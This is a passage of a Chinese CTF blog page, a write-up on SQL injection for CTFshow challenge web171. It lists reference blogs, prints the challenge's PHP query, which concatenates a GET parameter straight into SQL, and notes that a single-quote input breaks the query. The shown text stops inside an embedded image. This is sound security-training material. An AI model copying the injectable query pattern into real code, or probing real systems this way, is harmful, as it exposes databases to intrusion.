<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Web/CTFshow入门/sql注入" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.3.2">
<title data-rh="true">sql注入 | mumuzi的blog</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://mumuzi7179.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://mumuzi7179.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://mumuzi7179.github.io/docs/Web/CTFshow入门/sql注入"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="sql注入 | mumuzi的blog"><meta data-rh="true" name="description" content="参考文章"><meta data-rh="true" property="og:description" content="参考文章"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://mumuzi7179.github.io/docs/Web/CTFshow入门/sql注入"><link data-rh="true" rel="alternate" href="https://mumuzi7179.github.io/docs/Web/CTFshow入门/sql注入" hreflang="en"><link data-rh="true" rel="alternate" href="https://mumuzi7179.github.io/docs/Web/CTFshow入门/sql注入" hreflang="x-default"><link rel="preconnect" href="https://mc.yandex.ru">
<script>!function(e,t,a,c,n,r,i){e[n]=e[n]||function(){(e[n].a=e[n].a||[]).push(arguments)},e[n].l=1*new Date,r=t.createElement(a),i=t.getElementsByTagName(a)[0],r.async=1,r.src="https://mc.yandex.ru/metrika/tag.js",i.parentNode.insertBefore(r,i)}(window,document,"script",0,"ym"),ym(97401725,"init",{defer:!0,clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!1,ecommerce:!1,trackHash:!1})</script>
<noscript>
                            <div><img src="https://mc.yandex.ru/watch/97401725" style="position:absolute; left:-9999px;" alt=""></div>
                        </noscript><link rel="stylesheet" href="/assets/css/styles.fa1553c4.css">
<script src="/assets/js/runtime~main.d6e3714f.js" defer="defer"></script>
<script src="/assets/js/main.5e4996c0.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">mumuzi&#x27;s blog</b></a><a class="navbar__item navbar__link" href="/docs/Misc/index">Misc</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/Web/CTFshow入门/信息搜集">Web</a><a class="navbar__item navbar__link" href="/docs/Crypto/index">Crypto</a><a class="navbar__item navbar__link" href="/docs/Pwn/index">Pwn</a><a class="navbar__item navbar__link" href="/docs/Reverse/index">Reverse</a><a class="navbar__item navbar__link" href="/docs/CTF-Forensic/index">CTF-Forensic</a><a class="navbar__item navbar__link" href="/docs/Forensic/index">Forensic</a><a class="navbar__item navbar__link" href="/docs/tools_and_other/index">tools-others</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/docs/Blog/index">Blog</a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z"><input placeholder="Search" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Web/CTFshow入门/信息搜集">CTFshow入门</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/信息搜集">信息搜集</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/命令执行">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/文件包含">文件包含</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/php特性">php特性</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/文件上传">文件上传</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Web/CTFshow入门/sql注入">sql注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/反序列化">反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/代码审计">代码审计</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/phpCVE">phpCVE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/XSS">XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/nodejs">nodejs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/jwt">jwt</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/SSRF">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/SSTI">SSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/XXE">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Web/CTFshow入门/黑盒测试">黑盒测试</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">CTFshow入门</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">sql注入</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>sql注入</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考文章">参考文章<a href="#参考文章" class="hash-link" aria-label="Direct link to 参考文章" title="Direct link to 参考文章">​</a></h2>
<p>南神博客：<a href="https://www.wlhhlc.top/" target="_blank" rel="noopener noreferrer">https://www.wlhhlc.top/</a></p>
<p>y4博客：<a href="https://y4tacker.blog.csdn.net/" target="_blank" rel="noopener noreferrer">https://y4tacker.blog.csdn.net/</a></p>
<p>feng博客：<a href="https://ego00.blog.csdn.net/" target="_blank" rel="noopener noreferrer">https://ego00.blog.csdn.net/</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="sql注入-1">sql注入<a href="#sql注入-1" class="hash-link" aria-label="Direct link to sql注入" title="Direct link to sql注入">​</a></h2>
<p>咱就是说，现在开始做sql注入。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web171">web171<a href="#web171" class="hash-link" aria-label="Direct link to web171" title="Direct link to web171">​</a></h3>
<p>刚进去咱就能看出来，一共有3列，分别是id、username、password</p>
<p><img decoding="async" loading="lazy" alt="image-20211218145136055" src="/assets/images/image-20211218145136055-3df1d5097285780a101b9697ec45bc21.png" width="1469" height="773" class="img_ev3q"></p>
<p>其语句是</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以发现闭合的方式为单引号，如果输入1&#x27;，则构成了id = &#x27;1&#x27;&#x27; limt 1; 肯定会出现报错</p>
<p><img decoding="async" loading="lazy" alt="image-20211218145259919" src="data:image/png;base64,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